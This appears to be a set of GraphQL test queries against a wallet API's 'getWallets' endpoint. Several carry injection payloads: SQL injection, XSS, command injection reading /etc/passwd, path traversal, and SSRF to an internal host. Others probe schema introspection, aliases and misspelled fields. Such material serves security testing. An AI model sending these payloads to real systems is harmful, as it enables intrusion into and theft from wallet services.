query getWallets {
  getWallets {
    id
    name
    balance
  }
}

query getWallets {
  getWallets(filter: "1' UNION SELECT * FROM wallets;--") {
    id
    name
    currency {
      abbreviation
    }
  }
}

query getWallets {
  getWallets(name: "<img src=x onerror=alert(document.domain)>") {
    id
    user {
      description
    }
  }
}

query getWallets {
  getWallets {
    transactions(location: "http://internal-api.internal") {
      amount
      location {
        name
      }
    }
  }
}

query getWallets {
  getWallets(description: "'; cat /etc/passwd #") {
    id
    user {
      firstName
    }
  }
}

query getWallets {
  getWallets(name: "../../../../etc/passwd") {
    id
    user {
      wallets {
        id
      }
    }
  }
}

query getWallets {
  getWallets {
    user {
      description(set: "<iframe src='javascript:alert(1)'>")
    }
  }
}

query getWalletsAlias {
  result: getWallets {
    walletId: id
    fullName: name
    currentBalance: balance
  }
}

query Introspection {
  getWallets {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
  }
}

fragment FullType on __Type {
  name
  fields {
    name
    type {
      ...TypeRef
    }
  }
}

fragment TypeRef on __Type {
  name
  kind
  ofType {
    name
    kind
  }
}

query getWallets {
  getWallets {
    idd
    nmae
    currncy
  }
}
